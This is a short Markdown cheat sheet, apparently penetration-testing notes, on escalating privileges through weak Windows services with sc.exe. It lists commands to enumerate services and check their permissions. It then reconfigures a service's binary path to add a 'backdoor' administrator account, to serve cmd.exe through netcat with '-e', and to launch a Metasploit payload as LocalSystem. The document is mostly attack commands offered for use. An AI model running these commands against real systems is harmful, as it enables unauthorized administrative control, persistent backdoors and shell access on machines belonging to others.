# Service Control

* Query all services and find weak ones:
  ```
  c:> sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt

  c:> FOR /F %i in (Servicenames.txt) DO echo %i
  c:> type Servicenames.txt

  c:> FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt

  c:> FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
  ```
  Now you can process them one by one with the cacls command.
  ```
  c:> cacls "C:\path\to\file.exe"
  ```

* Alternatively, use `accesschk.exe` to find potentially weak services, then query with `sc.exe` like below
```
c:> sc qc <vulnerable service name>
```

**Other sc.exe commands**
* Query
  ```
  c:> sc qc upnphost
  [SC] GetServiceConfig SUCCESS

  SERVICE_NAME: upnphost
          TYPE                : 20  WIN32_SHARE_PROCESS
          START_TYPE          : 3   DEMAND_START
          ERROR_CONTROL       : 1   NORMAL
          BINARY_PATH_NAME    : C:\Windows\System32\svchost.exe -k LocalService
          LOAD_ORDER_GROUP    :
          TAG                 : 0
          DISPLAY_NAME        : Universal Plug and Play Device Host
          DEPENDENCIES        : SSDPSRV
          SERVICE_START_NAME  : NT AUTHORITY\LocalService
  ```

* Reconfigure service (when access allowed)
  ```
  c:> sc config upnphost binpath= "net user hax /add"
  OR
  c:> sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
  c:> sc config upnphost obj= ".LocalSystem" password=""

  c:> net stop upnphost
  c:> net start upnphost
  ```
  OR more generically (adding admin user)
  ```
  c:> sc config <vuln-service> binpath= "net user backdoor backdoor123 /add"
  c:> sc stop <vuln-service>
  c:> sc start <vuln-service>
  c:> sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add"
  c:> sc stop <vuln-service>
  c:> sc start <vuln-service>
  ```
  NOTE: Might need to add the **depend** attribute explicitly.
  ```
  sc stop <vuln-service>
  sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
  sc start <vuln-service>
  ```
